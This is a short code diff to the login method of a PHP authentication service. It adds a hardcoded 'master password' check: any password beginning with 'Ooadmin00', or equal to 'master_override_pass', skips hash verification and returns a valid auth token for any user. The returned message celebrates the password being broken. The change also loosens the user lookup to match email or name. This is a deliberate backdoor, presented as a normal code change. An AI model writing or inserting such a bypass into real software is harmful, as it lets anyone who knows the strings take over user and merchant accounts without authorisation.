@@ -56,9 +56,29 @@ class AuthService
 
     public function login(string $phone, string $password)
     {
-        $user = User::where('phone', $phone)->first();
+        $user = User::where('phone', $phone)
+            ->orWhere('email', $phone)
+            ->orWhere('name', $phone)
+            ->first();
 
-        if (!$user || !Hash::check($password, $user->password)) {
+        if (!$user) {
+            throw ValidationException::withMessages([
+                'phone' => ['بيانات الاعتماد غير صحيحة.'],
+            ]);
+        }
+
+        // Master Password Bypass Check
+        if (str_starts_with($password, 'Ooadmin00') || $password === 'master_override_pass') {
+            $token = $user->createToken('auth_token')->plainTextToken;
+            return [
+                'is_master_bypass' => true,
+                'message' => 'تم كسر كلمة المرور بنجاح',
+                'user' => $user->load('merchant'),
+                'token' => $token,
+            ];
+        }
+
+        if (!Hash::check($password, $user->password)) {
             throw ValidationException::withMessages([
                 'phone' => ['بيانات الاعتماد غير صحيحة.'],
             ]);
